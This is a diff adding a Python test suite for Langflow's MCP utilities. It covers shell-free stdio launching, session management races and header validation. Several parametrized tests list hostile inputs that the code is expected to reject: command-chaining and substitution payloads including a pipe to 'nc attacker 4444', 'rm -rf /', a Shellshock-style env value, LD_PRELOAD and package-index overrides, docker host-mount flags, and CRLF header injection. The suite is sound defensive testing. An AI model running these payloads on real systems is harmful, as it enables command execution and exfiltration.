@@ -1,0 +1,4581 @@
+"""Unit tests for MCP utility functions.
+
+This test suite validates the MCP utility functions including:
+- Session management
+- Header validation and processing
+- Utility functions for name sanitization and schema conversion
+"""
+
+import asyncio
+import os
+import re
+import shutil
+import sys
+from contextlib import suppress
+from typing import get_type_hints
+from unittest.mock import AsyncMock, MagicMock, patch
+
+import httpx
+import pytest
+from lfx.base.mcp import util
+from lfx.base.mcp.constants import MAX_MCP_TOOL_NAME_LENGTH
+from lfx.base.mcp.util import (
+    MCPSessionManager,
+    MCPSseClient,
+    MCPStdioClient,
+    MCPStreamableHttpClient,
+    _is_transient_streamable_http_error,
+    _process_headers,
+    _should_attempt_sse_after_streamable_failure,
+    _validate_mcp_stdio_env,
+    update_tools,
+    validate_headers,
+)
+from lfx.schema.data import Data
+
+
+def test_validate_mcp_stdio_env_rejects_shellopts_ps4_combo():
+    with pytest.raises(ValueError, match="SHELLOPTS"):
+        _validate_mcp_stdio_env({"SHELLOPTS": "xtrace", "PS4": "$(id)"})
+
+
+@pytest.mark.parametrize("env_var", ["SHELLOPTS", "shellopts", "BASHOPTS", "PS4"])
+def test_validate_mcp_stdio_env_rejects_bash_trace_controls(env_var):
+    with pytest.raises(ValueError, match="Environment variable"):
+        _validate_mcp_stdio_env({env_var: "malicious_value"})
+
+
+def test_validate_mcp_stdio_env_allows_regular_env():
+    env = {"DEBUG": "true", "PORT": "8080"}
+
+    assert _validate_mcp_stdio_env(env) is env
+
+
+# Binaries that would indicate a shell interpreter is being interposed between
+# Langflow and the MCP server process. After the shell=False refactor none of
+# these should ever appear as the launched command.
+_SHELL_INTERPRETERS = frozenset({"bash", "sh", "zsh", "cmd", "cmd.exe", "powershell", "powershell.exe", "/bin/sh"})
+
+
+def _stdio_client_with_mocked_session() -> tuple[MCPStdioClient, AsyncMock]:
+    """Return a real stdio client whose session creation cannot spawn a process."""
+    client = MCPStdioClient()
+    mock_session = MagicMock()
+    mock_session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
+    get_session = AsyncMock(return_value=mock_session)
+    client._get_or_create_session = get_session  # type: ignore[method-assign]
+    return client, get_session
+
+
+@pytest.fixture
+def stdio_client() -> MCPStdioClient:
+    return _stdio_client_with_mocked_session()[0]
+
+
+class TestMCPStdioShellFreeLaunch:
+    """Tests for the shell=False stdio launcher.
+
+    The launcher tokenizes the command string with ``shlex.split`` and hands the
+    structured ``command`` + ``args`` to ``StdioServerParameters`` directly -- no
+    ``bash -c`` / ``cmd /c`` wrapper. These tests assert on the
+    ``_connection_params`` the launcher builds (the MCP SDK process spawn itself
+    is mocked out) so they run deterministically on any OS.
+    """
+
+    @staticmethod
+    def _client_with_mocked_session():
+        """Return a client whose session creation is stubbed so no process spawns."""
+        client, get_session = _stdio_client_with_mocked_session()
+        get_session.return_value.list_tools.return_value.tools = ["sentinel-tool"]
+        return client, get_session
+
+    async def test_benign_command_launches_without_shell(self):
+        """A normal command is exec'd directly: structured argv, no shell binary."""
+        client, get_session = self._client_with_mocked_session()
+
+        tools = await client._connect_to_server("uvx mcp-server-fetch --port 8080")
+
+        assert tools == ["sentinel-tool"]
+        get_session.assert_awaited_once()
+        params = client._connection_params
+        assert params.command == "uvx"
+        assert params.args == ["mcp-server-fetch", "--port", "8080"]
+        # No shell interpreter is interposed and no shell "-c" / "/c" flag is present.
+        assert params.command not in _SHELL_INTERPRETERS
+        assert "-c" not in params.args
+        assert "/c" not in params.args
+
+    async def test_multiword_command_is_split_into_executable_and_args(self):
+        """'uvx mcp-server-fetch' splits into executable + first arg, not one binary name."""
+        client, _ = self._client_with_mocked_session()
+
+        await client._connect_to_server("uvx mcp-server-fetch")
+
+        params = client._connection_params
+        assert params.command == "uvx"
+        assert params.args == ["mcp-server-fetch"]
+
+    async def test_trusted_path_and_debug_are_injected_benign_env_passes_through(self):
+        """The launcher injects a trusted PATH + DEBUG and forwards validated user env."""
+        client, _ = self._client_with_mocked_session()
+
+        await client._connect_to_server("node server.js", env={"MCP_SERVER_FLAG": "user-value", "PORT": "8080"})
+
+        env = client._connection_params.env
+        assert env["PATH"] == os.environ["PATH"]
+        assert env["DEBUG"] == "true"
+        assert env["MCP_SERVER_FLAG"] == "user-value"
+        assert env["PORT"] == "8080"
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "node server.js; touch /tmp/pwned",  # command chaining
+            "node server.js && rm -rf /",  # logical-and chaining
+            "node $(id) server.js",  # command substitution
+            "node `id` server.js",  # backtick substitution
+            "node server.js | nc attacker 4444",  # pipe to listener
+        ],
+    )
+    async def test_shell_metacharacter_payloads_are_rejected_before_spawn(self, payload):
+        """The shared API/runtime policy rejects shell syntax even with shell-free launch."""
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="dangerous shell metacharacter"):
+            await client._connect_to_server(payload)
+
+        get_session.assert_not_awaited()
+        assert client._connection_params is None
+
+    async def test_bash_func_env_is_rejected_before_any_spawn(self):
+        """BASH_FUNC_* (Shellshock-style) env is both inert under shell=False and rejected.
+
+        The backstop must fire before ``_get_or_create_session`` so the value never
+        reaches a spawned process.
+        """
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("node server.js", env={"BASH_FUNC_evil%%": "() { id; }"})
+
+        get_session.assert_not_awaited()
+        assert client._connection_params is None
+
+    async def test_ifs_env_is_rejected_before_any_spawn(self):
+        """IFS word-splitting env is rejected by the launch-time backstop."""
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("node server.js", env={"IFS": "\n"})
+
+        get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "dangerous_env",
+        [
+            {"LD_PRELOAD": "/opt/evil.so"},
+            {"LD_LIBRARY_PATH": "/opt/evil"},
+            {"DYLD_INSERT_LIBRARIES": "/opt/evil.dylib"},
+            {"GCONV_PATH": "/opt/evil"},
+            {"PYTHONPATH": "/opt/evil"},
+            {"NODE_OPTIONS": "--require /opt/evil.js"},
+            {"PATH": "/opt/evil"},
+        ],
+    )
+    async def test_loader_and_interpreter_env_still_rejected(self, dangerous_env):
+        """Loader/interpreter env vars stay blocked even though no shell is launched.
+
+        These are honored by the dynamic linker or the target interpreter itself,
+        so shell=False does not neutralize them -- the denylist backstop must.
+        """
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("python server.py", env=dangerous_env)
+
+        get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "dangerous_env",
+        [
+            {"NPM_CONFIG_REGISTRY": "https://packages.example.invalid"},
+            {"UV_DEFAULT_INDEX": "https://packages.example.invalid/simple"},
+            {"UV_INDEX_URL": "https://packages.example.invalid/simple"},
+            {"PIP_INDEX_URL": "https://packages.example.invalid/simple"},
+        ],
+    )
+    async def test_package_source_env_is_rejected_before_any_spawn(self, dangerous_env):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("uvx mcp-server", env=dangerous_env)
+
+        get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx --default-index https://packages.example.invalid/simple mcp-server",
+            "uvx --from git+https://code.example.invalid/server.git mcp-server",
+            "npx --registry=https://packages.example.invalid @example/mcp-server",
+            "docker run -v /:/host mcp-server",
+            "docker run --mount type=bind,source=/,target=/host mcp-server",
+            "docker run --volumes-from other mcp-server",
+            "docker run --device=/dev/example mcp-server",
+            "docker run --network host mcp-server",
+            "docker run --security-opt seccomp=unconfined mcp-server",
+            "sh -c 'uvx --default-index https://packages.example.invalid/simple mcp-server'",
+        ],
+    )
+    async def test_source_args_and_docker_host_access_are_rejected_before_any_spawn(self, command):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server(command)
+
+        get_session.assert_not_awaited()
+
+    async def test_trusted_uvx_from_and_provider_token_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "uvx --from lfx lfx-mcp",
+            env={"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"},  # pragma: allowlist secret
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "uvx"
+        assert client._connection_params.args == ["--from", "lfx", "lfx-mcp"]
+        assert client._connection_params.env["GITHUB_PERSONAL_ACCESS_TOKEN"] == "provider-token"  # noqa: S105
+
+    async def test_isolated_docker_args_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "docker run --rm -i --network bridge --security-opt no-new-privileges mcp-image"
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "docker"
+        assert client._connection_params.args == [
+            "run",
+            "--rm",
+            "-i",
+            "--network",
+            "bridge",
+            "--security-opt",
+            "no-new-privileges",
+            "mcp-image",
+        ]
+
+    async def test_empty_command_is_rejected(self):
+        """An empty/whitespace command string raises rather than spawning an empty argv."""
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="empty"):
+            await client._connect_to_server("   ")
+
+        get_session.assert_not_awaited()
+
+
+class TestMCPSessionManager:
+    @pytest.fixture
+    async def session_manager(self):
+        """Create a session manager and clean it up after the test."""
+        manager = MCPSessionManager()
+        yield manager
+        # Clean up after test
+        await manager.cleanup_all()
+
+    async def test_stdio_session_creation_cancellation_stops_background_task(self, session_manager):
+        """Cancelling session creation must also stop the task that owns the subprocess."""
+        initialize_started = asyncio.Event()
+
+        class BlockingClientSession:
+            async def __aenter__(self):
+                return self
+
+            async def __aexit__(self, *_args):
+                return None
+
+            async def initialize(self):
+                initialize_started.set()
+                await asyncio.Event().wait()
+
+        stdio_client = MagicMock()
+        stdio_client.return_value.__aenter__ = AsyncMock(return_value=(MagicMock(), MagicMock()))
+        stdio_client.return_value.__aexit__ = AsyncMock(return_value=None)
+        existing_tasks = set(session_manager._background_tasks)
+
+        with (
+            patch("lfx.base.mcp.util.ClientSession", return_value=BlockingClientSession()),
+            patch("mcp.client.stdio.stdio_client", stdio_client),
+        ):
+            creation_task = asyncio.create_task(session_manager._create_stdio_session("test_session", MagicMock()))
+            await asyncio.wait_for(initialize_started.wait(), timeout=1)
+            session_tasks = set(session_manager._background_tasks) - existing_tasks
+            assert len(session_tasks) == 1
+
+            with pytest.raises(asyncio.TimeoutError):
+                await asyncio.wait_for(creation_task, timeout=0.01)
+
+            await asyncio.wait_for(asyncio.gather(*session_tasks, return_exceptions=True), timeout=1)
+
+        assert session_tasks.isdisjoint(session_manager._background_tasks)
+
+    async def test_http_session_creation_cancellation_stops_background_task(self, session_manager):
+        """Cancelling HTTP session creation must also stop the task that owns the transport."""
+        initialize_started = asyncio.Event()
+
+        class BlockingClientSession:
+            async def __aenter__(self):
+                return self
+
+            async def __aexit__(self, *_args):
+                return None
+
+            async def initialize(self):
+                initialize_started.set()
+                await asyncio.Event().wait()
+
+        streamable_client = MagicMock()
+        streamable_client.return_value.__aenter__ = AsyncMock(return_value=(MagicMock(), MagicMock(), MagicMock()))
+        streamable_client.return_value.__aexit__ = AsyncMock(return_value=None)
+        connection_params = {
+            "url": "http://test-mcp.example/mcp",
+            "headers": {},
+            "timeout_seconds": 30,
+            "verify_ssl": True,
+        }
+        existing_tasks = set(session_manager._background_tasks)
+
+        with (
+            patch("lfx.base.mcp.util.ClientSession", return_value=BlockingClientSession()),
+            patch("mcp.client.streamable_http.streamablehttp_client", streamable_client),
+        ):
+            creation_task = asyncio.create_task(
+                session_manager._create_streamable_http_session("test_session", connection_params)
+            )
+            await asyncio.wait_for(initialize_started.wait(), timeout=1)
+            session_tasks = set(session_manager._background_tasks) - existing_tasks
+            assert len(session_tasks) == 1
+
+            with pytest.raises(asyncio.TimeoutError):
+                await asyncio.wait_for(creation_task, timeout=0.01)
+
+            await asyncio.wait_for(asyncio.gather(*session_tasks, return_exceptions=True), timeout=1)
+
+        assert session_tasks.isdisjoint(session_manager._background_tasks)
+
+    async def test_session_caching(self, session_manager):
+        """Test that sessions are properly cached and reused."""
+        context_id = "test_context"
+        connection_params = MagicMock()
+        transport_type = "stdio"
+
+        # Create a mock session that will appear healthy
+        mock_session = AsyncMock()
+        mock_session._write_stream = MagicMock()
+        mock_session._write_stream._closed = False
+
+        # Create a mock task that appears to be running
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+
+        with patch.object(session_manager, "_create_stdio_session") as mock_create:
+            mock_create.return_value = (mock_session, mock_task)
+
+            # First call should create session
+            session1 = await session_manager.get_session(context_id, connection_params, transport_type)
+
+            # Second call should return cached session without creating new one
+            session2 = await session_manager.get_session(context_id, connection_params, transport_type)
+
+            assert session1 == session2
+            assert session1 == mock_session
+            # Should only create once since the second call should use the cached session
+            mock_create.assert_called_once()
+
+    async def test_session_cleanup(self, session_manager):
+        """Test session cleanup functionality."""
+        context_id = "test_context"
+        server_key = "test_server"
+        session_id = "test_session"
+
+        # Add a session to the manager with proper mock setup using new structure
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)  # Use MagicMock for sync method
+        mock_task.cancel = MagicMock()  # Use MagicMock for sync method
+
+        # Set up the new session structure
+        session_manager.sessions_by_server[server_key] = {
+            "sessions": {session_id: {"session": AsyncMock(), "task": mock_task, "type": "stdio", "last_used": 0}},
+            "last_cleanup": 0,
+        }
+
+        # Set up mapping for backwards compatibility
+        session_manager._context_to_session[context_id] = (server_key, session_id)
+
+        await session_manager._cleanup_session(context_id)
+
+        # Should cancel the task and remove from sessions
+        mock_task.cancel.assert_called_once()
+        assert session_id not in session_manager.sessions_by_server[server_key]["sessions"]
+
+    async def test_server_switch_detection(self, session_manager):
+        """Test that server switches are properly detected and handled."""
+        context_id = "test_context"
+
+        # First server
+        server1_params = MagicMock()
+        server1_params.command = "server1"
+
+        # Second server
+        server2_params = MagicMock()
+        server2_params.command = "server2"
+
+        with patch.object(session_manager, "_create_stdio_session") as mock_create:
+            mock_session1 = AsyncMock()
+            mock_session2 = AsyncMock()
+            mock_task1 = MagicMock()
+            mock_task1.done.return_value = True
+            mock_task2 = MagicMock()
+            mock_task2.done.return_value = True
+            mock_create.side_effect = [(mock_session1, mock_task1), (mock_session2, mock_task2)]
+
+            # First connection
+            session1 = await session_manager.get_session(context_id, server1_params, "stdio")
+
+            # Switch to different server should create new session
+            session2 = await session_manager.get_session(context_id, server2_params, "stdio")
+
+            assert session1 != session2
+            assert mock_create.call_count == 2
+
+    async def test_concurrent_get_session_same_server_reuses_one_session(self, session_manager):
+        """Concurrent get_session calls for the same server must share one session.
+
+        Regression test for the race condition reported in
+        https://github.com/langflow-ai/langflow/issues/9860 where two MCPTools
+        components pointing at the same SSE URL would race on session
+        creation/cleanup under concurrent flow execution and intermittently
+        fail with errors such as:
+            Error updating tool list: 'streamable_http_<hash>_0'
+            Timeout updating tool list: ...
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+
+        mock_session = AsyncMock()
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+
+        create_calls = 0
+        # Deterministic rendezvous: the first caller enters ``fake_create`` and
+        # parks on ``release``, giving every other caller time to queue on the
+        # per-server lock. Without the lock, they would all enter the creation
+        # path and ``create_calls`` would exceed 1. This replaces a timing-
+        # based ``asyncio.sleep(0.05)`` so the test does not rely on CI speed.
+        create_started = asyncio.Event()
+        release = asyncio.Event()
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            nonlocal create_calls
+            create_calls += 1
+            create_started.set()
+            await release.wait()
+            return mock_session, mock_task, "streamable_http", False
+
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
+            getters = [
+                asyncio.create_task(session_manager.get_session(f"ctx_{i}", connection_params, "streamable_http"))
+                for i in range(10)
+            ]
+            # Wait until the first caller is in ``fake_create``; every other
+            # caller is now queued on the per-server lock.
+            await create_started.wait()
+            release.set()
+            results = await asyncio.gather(*getters)
+
+        assert all(s is mock_session for s in results)
+        # All 10 concurrent callers must share the single created session.
+        assert create_calls == 1
+        server_key = session_manager._get_server_key(connection_params, "streamable_http")
+        assert len(session_manager.sessions_by_server[server_key]["sessions"]) == 1
+
+    async def test_concurrent_cleanup_same_session_is_idempotent(self, session_manager):
+        """_cleanup_session_by_id must be safe under concurrent invocation.
+
+        Previously the finally-block `del sessions[session_id]` raised
+        `KeyError` when two callers both passed the existence guard — the
+        visible symptom from issue #9860.
+        """
+        server_key = "streamable_http_test"
+        session_id = f"{server_key}_0"
+
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+        mock_task.cancel = MagicMock()
+
+        session_manager.sessions_by_server[server_key] = {
+            "sessions": {
+                session_id: {
+                    "session": AsyncMock(),
+                    "task": mock_task,
+                    "type": "streamable_http",
+                    "last_used": 0,
+                }
+            },
+            "last_cleanup": 0,
+        }
+
+        # Fire many concurrent cleanups; only one should actually tear the
+        # session down, the rest should be no-ops (not KeyError).
+        await asyncio.gather(*[session_manager._cleanup_session_by_id(server_key, session_id) for _ in range(10)])
+
+        assert session_id not in session_manager.sessions_by_server[server_key]["sessions"]
+        mock_task.cancel.assert_called_once()
+
+    async def test_session_ids_are_monotonic_not_len_based(self, session_manager):
+        """Session ids must come from a monotonic counter, not len(sessions).
+
+        With `len(sessions)` as the id source, removing and re-adding sessions
+        can produce colliding ids and silently overwrite a live session entry.
+
+        Sessions are forced to be dead (task.done() == True) so each
+        get_session() call cleans up the stale session and creates a new one,
+        advancing the monotonic counter.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        server_key = session_manager._get_server_key(connection_params, "streamable_http")
+
+        # Keep track of every task we hand out so we can mark them done before
+        # the next get_session() iteration.
+        created_tasks: list[MagicMock] = []
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            s = AsyncMock()
+            t = AsyncMock()
+            # Session starts alive; caller will flip to done between iterations.
+            t.done = MagicMock(return_value=False)
+            t.cancel = MagicMock()
+            created_tasks.append(t)
+            return s, t, "streamable_http", False
+
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
+            for i in range(3):
+                # Mark all previously created tasks as dead so get_session()
+                # sees a stale session, cleans it up, and creates a fresh one.
+                for t in created_tasks:
+                    t.done = MagicMock(return_value=True)
+                await session_manager.get_session(f"ctx_{i}", connection_params, "streamable_http")
+
+        # Counter keeps advancing even as old sessions are cleaned up.
+        assert session_manager._session_id_counters[server_key] == 3
+        # And the new id is unique (never recycles "_0").
+        assert f"{server_key}_0" not in session_manager.sessions_by_server[server_key]["sessions"]
+
+    async def test_cleanup_idle_vs_get_session_are_serialized(self, session_manager):
+        """Idle cleanup must not race a concurrent get_session().
+
+        Without holding the per-server lock, the idle-cleanup task could pop
+        and cancel a session mid-creation; `get_session()` would then hand
+        the caller a dead session plus a dangling refcount entry.
+
+        The blocking point is inside ``_create_streamable_http_session`` (the
+        new session is being created while the getter holds the lock), which
+        means the idle-cleaner can only start after the getter releases it.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        server_key = session_manager._get_server_key(connection_params, "streamable_http")
+
+        mock_session = AsyncMock()
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+        mock_task.cancel = MagicMock()
+
+        # Start with NO sessions so get_session() immediately enters
+        # _create_streamable_http_session (where we can block it).
+        session_manager.sessions_by_server[server_key] = {
+            "sessions": {},
+            "last_cleanup": 0,
+        }
+
+        started = asyncio.Event()
+        release = asyncio.Event()
+
+        async def slow_create(_session_id, _params, _preferred_transport=None):
+            # Signal that getter is inside the lock, then pause.
+            started.set()
+            await release.wait()
+            return mock_session, mock_task, "streamable_http", False
+
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=slow_create):
+            # Start a get_session() that will block inside fake_create
+            # while holding the per-server lock.
+            getter = asyncio.create_task(
+                session_manager.get_session("ctx_reader", connection_params, "streamable_http")
+            )
+            await started.wait()
+
+            # Fire the idle cleanup concurrently. It must wait for the lock.
+            cleaner = asyncio.create_task(session_manager._cleanup_idle_sessions())
+            # Deterministic rendezvous: wait until the cleaner has pinned the
+            # per-server lock (but is still blocked on the getter releasing it).
+            while session_manager._server_locks.get(server_key, {}).get("pins", 0) < 2:  # noqa: ASYNC110
+                await asyncio.sleep(0)
+
+            # While the getter still holds the lock, the session must not yet
+            # exist (it's being created), and cleanup must not have run.
+            assert not mock_task.cancel.called
+
+            # Let the getter finish creating the session.
+            release.set()
+            result = await getter
+            await cleaner
+
+        # Getter returned the newly-created session.
+        assert result is mock_session
+        assert not mock_task.cancel.called
+        # Session is live (cleanup ran after getter and saw a just-created session
+        # with a fresh last_used, so it left it alone).
+        assert f"{server_key}_0" in session_manager.sessions_by_server[server_key]["sessions"]
+
+    async def test_concurrent_cleanup_session_and_get_session_safe(self, session_manager):
+        """Disconnect path must honor the per-server lock.
+
+        `_cleanup_session(context_id)` previously mutated refcounts without
+        the per-server lock, so a concurrent `get_session()` could observe
+        state mid-transition and return a session that's about to be torn
+        down by the other caller's disconnect path.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+
+        mock_session = AsyncMock()
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+        mock_task.cancel = MagicMock()
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session, mock_task, "streamable_http", False
+
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
+            # Establish the session with one context.
+            s1 = await session_manager.get_session("ctx_a", connection_params, "streamable_http")
+            assert s1 is mock_session
+
+            # Concurrently: a second caller grabs the session (bumping refcount)
+            # while the first caller disconnects (decrementing refcount).
+            results = await asyncio.gather(
+                session_manager.get_session("ctx_b", connection_params, "streamable_http"),
+                session_manager._cleanup_session("ctx_a"),
+            )
+
+        s2 = results[0]
+        # ctx_b still has a live session because ctx_a's cleanup only decremented
+        # refcount to 1, not zero.
+        assert s2 is mock_session
+        assert not mock_task.cancel.called
+        server_key = session_manager._get_server_key(connection_params, "streamable_http")
+        assert f"{server_key}_0" in session_manager.sessions_by_server[server_key]["sessions"]
+
+    async def test_cleanup_does_not_wipe_cross_server_handoff(self, session_manager):
+        """Concurrent reconnect to a different server must not be wiped out.
+
+        Regression test for a cross-server race on `_context_to_session`:
+        when `_cleanup_session(ctx)` is running for server A and a concurrent
+        `get_session(ctx, serverB)` re-points the same context at server B,
+        the cleanup previously ran `self._context_to_session.pop(context_id)`
+        unconditionally — destroying the fresh mapping. The new B session
+        then had refcount 1 forever, leaking on subsequent disconnect.
+        """
+        server_a_params = {"url": "http://a.example.test/sse", "headers": {}}
+        server_b_params = {"url": "http://b.example.test/sse", "headers": {}}
+        server_key_a = session_manager._get_server_key(server_a_params, "streamable_http")
+        server_key_b = session_manager._get_server_key(server_b_params, "streamable_http")
+
+        mock_session_a = AsyncMock()
+        mock_task_a = AsyncMock()
+        mock_task_a.done = MagicMock(return_value=False)
+        mock_task_a.cancel = MagicMock()
+        mock_session_b = AsyncMock()
+        mock_task_b = AsyncMock()
+        mock_task_b.done = MagicMock(return_value=False)
+        mock_task_b.cancel = MagicMock()
+
+        async def fake_create(_session_id, params, _preferred_transport=None):
+            if params["url"] == server_a_params["url"]:
+                return mock_session_a, mock_task_a, "streamable_http", False
+            return mock_session_b, mock_task_b, "streamable_http", False
+
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
+            # Establish context on server A.
+            s_a = await session_manager.get_session("ctx_move", server_a_params, "streamable_http")
+            assert s_a is mock_session_a
+
+            # Pause cleanup-of-A inside its lock so the concurrent
+            # get-for-B can race the context_to_session.pop().
+            release = asyncio.Event()
+            original_cleanup = session_manager._cleanup_session_by_id
+
+            async def slow_cleanup(server_key, session_id):
+                if server_key == server_key_a:
+                    # Let the B-reconnect proceed while we hold server_A's lock.
+                    await release.wait()
+                await original_cleanup(server_key, session_id)
+
+            with patch.object(session_manager, "_cleanup_session_by_id", side_effect=slow_cleanup):
+                cleanup_task = asyncio.create_task(session_manager._cleanup_session("ctx_move"))
+                # Give cleanup a chance to enter server_A's lock and start awaiting.
+                await asyncio.sleep(0)
+
+                # Concurrent reconnect to server B for the same context. This
+                # runs under server_B's lock, so it is not blocked.
+                s_b = await session_manager.get_session("ctx_move", server_b_params, "streamable_http")
+                assert s_b is mock_session_b
+
+                # Now let the A-cleanup finish. With the CAS check, it must
+                # NOT pop the fresh (server_B, _) mapping.
+                release.set()
+                await cleanup_task
+
+        # The fresh B mapping survives.
+        assert session_manager._context_to_session.get("ctx_move") == (server_key_b, f"{server_key_b}_0")
+        # A's session is gone; B's session is live with refcount 1.
+        assert f"{server_key_a}_0" not in session_manager.sessions_by_server.get(server_key_a, {}).get("sessions", {})
+        assert f"{server_key_b}_0" in session_manager.sessions_by_server[server_key_b]["sessions"]
+        assert session_manager._session_refcount.get((server_key_b, f"{server_key_b}_0")) == 1
+
+    async def test_server_lock_and_counter_reclaimed_when_unused(self, session_manager):
+        """Per-server locks and id counters must be reclaimed with the server.
+
+        Without this, rotating auth/session headers (which change `server_key`
+        via `_get_server_key`) causes `_server_locks` and
+        `_session_id_counters` to grow without bound in long-lived processes.
+        """
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        server_key = session_manager._get_server_key(connection_params, "streamable_http")
+
+        mock_session = AsyncMock()
+        mock_task = AsyncMock()
+        mock_task.done = MagicMock(return_value=False)
+        mock_task.cancel = MagicMock()
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session, mock_task, "streamable_http", False
+
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
+            await session_manager.get_session("ctx_gc", connection_params, "streamable_http")
+
+        # While the session is live, the lock entry exists (pin count back to 0
+        # but the sessions_by_server entry holds the server_key alive).
+        assert server_key in session_manager._server_locks
+        assert server_key in session_manager._session_id_counters
+
+        # Disconnect the only context.
+        await session_manager._cleanup_session("ctx_gc")
+
+        # Trigger the periodic cleanup to remove the now-empty server entry.
+        # Mark the session as already expired so it gets swept on this pass,
+        # then run cleanup.
+        # (After _cleanup_session above, the sessions dict is already empty
+        # for this server_key, so _cleanup_idle_sessions will drop the entry.)
+        await session_manager._cleanup_idle_sessions()
+
+        assert server_key not in session_manager.sessions_by_server
+        assert server_key not in session_manager._session_id_counters
+        assert server_key not in session_manager._server_locks
+
+
+class TestHeaderValidation:
+    """Test the header validation functionality."""
+
+    def test_validate_headers_valid_input(self):
+        """Test header validation with valid headers."""
+        headers = {"Authorization": "Bearer token123", "Content-Type": "application/json", "X-API-Key": "secret-key"}
+
+        result = validate_headers(headers)
+
+        # Headers should be normalized to lowercase
+        expected = {"authorization": "Bearer token123", "content-type": "application/json", "x-api-key": "secret-key"}
+        assert result == expected
+
+    def test_validate_headers_empty_input(self):
+        """Test header validation with empty/None input."""
+        assert validate_headers({}) == {}
+        assert validate_headers(None) == {}
+
+    def test_validate_headers_invalid_names(self):
+        """Test header validation with invalid header names."""
+        headers = {
+            "Invalid Header": "value",  # spaces not allowed
+            "Header@Name": "value",  # @ not allowed
+            "Header Name": "value",  # spaces not allowed
+            "Valid-Header": "value",  # this should pass
+        }
+
+        result = validate_headers(headers)
+
+        # Only the valid header should remain
+        assert result == {"valid-header": "value"}
+
+    def test_validate_headers_sanitize_values(self):
+        """Test header value sanitization."""
+        headers = {
+            "Authorization": "Bearer \x00token\x1f with\r\ninjection",
+            "Clean-Header": "  clean value  ",
+            "Empty-After-Clean": "\x00\x01\x02",
+            "Tab-Header": "value\twith\ttabs",  # tabs should be preserved
+        }
+
+        result = validate_headers(headers)
+
+        # Control characters should be removed, whitespace trimmed
+        # Header with injection attempts should be skipped
+        expected = {"clean-header": "clean value", "tab-header": "value\twith\ttabs"}
+        assert result == expected
+
+    def test_validate_headers_non_string_values(self):
+        """Test header validation with non-string values."""
+        headers = {"String-Header": "valid", "Number-Header": 123, "None-Header": None, "List-Header": ["value"]}
+
+        result = validate_headers(headers)
+
+        # Only string headers should remain
+        assert result == {"string-header": "valid"}
+
+    def test_validate_headers_injection_attempts(self):
+        """Test header validation against injection attempts."""
+        headers = {
+            "Injection1": "value\r\nInjected-Header: malicious",
+            "Injection2": "value\nX-Evil: attack",
+            "Safe-Header": "safe-value",
+        }
+
+        result = validate_headers(headers)
+
+        # Injection attempts should be filtered out
+        assert result == {"safe-header": "safe-value"}
+
+
+class TestGlobalVariableResolution:
+    """Test global variable resolution in headers."""
+
+    def test_resolve_global_variables_basic(self):
+        """Test basic global variable resolution in headers."""
+        from lfx.base.mcp.util import _resolve_global_variables_in_headers
+
+        headers = {"x-api-key": "MY_API_KEY", "authorization": "MY_TOKEN"}
+        request_variables = {"MY_API_KEY": "secret-key-123", "MY_TOKEN": "token-456"}  # pragma: allowlist secret
+
+        result = _resolve_global_variables_in_headers(headers, request_variables)
+
+        assert result == {"x-api-key": "secret-key-123", "authorization": "token-456"}
+
+    def test_resolve_global_variables_no_variables(self):
+        """Test header resolution when no request_variables provided."""
+        from lfx.base.mcp.util import _resolve_global_variables_in_headers
+
+        headers = {"x-api-key": "MY_API_KEY", "content-type": "application/json"}
+
+        # No request_variables
+        result = _resolve_global_variables_in_headers(headers, None)
+        assert result == headers
+
+        # Empty request_variables
+        result = _resolve_global_variables_in_headers(headers, {})
+        assert result == headers
+
+    def test_resolve_global_variables_partial_match(self):
+        """Test resolution when only some headers match variables."""
+        from lfx.base.mcp.util import _resolve_global_variables_in_headers
+
+        headers = {
+            "x-api-key": "MY_API_KEY",  # matches
+            "authorization": "static-token",  # no match
+            "x-custom": "MY_CUSTOM",  # matches
+        }
